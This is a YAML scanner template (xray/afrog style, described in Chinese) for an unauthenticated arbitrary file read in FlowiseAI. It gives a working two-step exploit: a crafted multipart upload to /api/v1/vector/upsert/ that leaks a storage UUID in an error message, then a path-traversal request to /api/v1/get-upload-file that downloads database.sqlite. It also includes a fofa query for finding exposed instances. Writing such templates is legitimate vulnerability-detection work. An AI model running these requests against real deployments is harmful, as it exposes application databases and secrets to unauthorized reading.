id: flowise-ai-fileread
info:
  name: FlowiseAI未授权任意文件读取漏洞
  author: avic123
  severity: high
  verified: true
  description: |
    FlowiseAI是一个基于Node.js和React构建的开源项目，提供直观的可视化界面来设计和部署AI工作流。它采用模块化架构，支持超过100种AI服务和工具的无缝集成。FlowiseAI /api/v1/get-upload-file 和 /api/v1/openai-assistants-file/download 两个接口存在任意文件读取漏洞
    fofa：app="FlowiseAI"
  reference:
    - https://mp.weixin.qq.com/s/85Ut9dw6kOJusZOMXN0lpg
  tags: flowiseAI,readfile
  created: 2025/09/22

rules:
  r0:
    request:
      method: POST
      path: /api/v1/vector/upsert/
      headers:
        Content-Type: multipart/form-data; boundary=----WebKitFormBoundary7MA4YWxkTrZu0gW
      body: |

        ------WebKitFormBoundary7MA4YWxkTrZu0gW
        Content-Disposition: form-data; name="files"; filename="?"
        Content-Type: text/plain 


        ------WebKitFormBoundary7MA4YWxkTrZu0gW--
    expression: response.status == 500 && response.body.bcontains(b'EISDIR')
    output:
      search: |-
        "open \\\'/root/.flowise/storage/[a-f0-9-]+/(?P<uuid>[a-f0-9-]{36})\'".bsubmatch(response.body)
      error_uuid: search["uuid"]
  r1:
    request:
      method: GET
      path: /api/v1/get-upload-file?chatflowId={{error_uuid}}&chatId=../.././&fileName=database.sqlite
    expression: response.status == 200 && response.body.bcontains(b'SQLite format')
expression: r0() && r1()
